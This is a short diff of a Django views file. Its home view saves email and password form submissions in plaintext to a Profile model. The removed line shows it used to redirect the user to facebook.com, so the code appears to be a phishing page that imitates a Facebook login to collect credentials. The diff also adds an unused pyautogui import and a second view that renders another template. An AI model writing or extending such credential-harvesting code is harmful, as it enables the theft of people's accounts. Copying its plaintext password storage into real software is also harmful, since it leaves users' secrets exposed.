@@ -1,5 +1,7 @@
-from django.shortcuts import render, redirect
+﻿from django.shortcuts import render, redirect
 from .models import Profile
+from django.http import JsonResponse
+import pyautogui
 
 # Create your views here.
 def home(request):
@@ -7,6 +9,8 @@ def home(request):
         email = request.POST['email']
         password = request.POST['password']
         profile = Profile.objects.create(email=email, password=password)
-        return redirect('https://www.facebook.com/')  # Redirect to facebook.com
 
+    return render(request, 'login/index2.html')
+
+def animation_complete(request):
     return render(request, 'login/index.html')
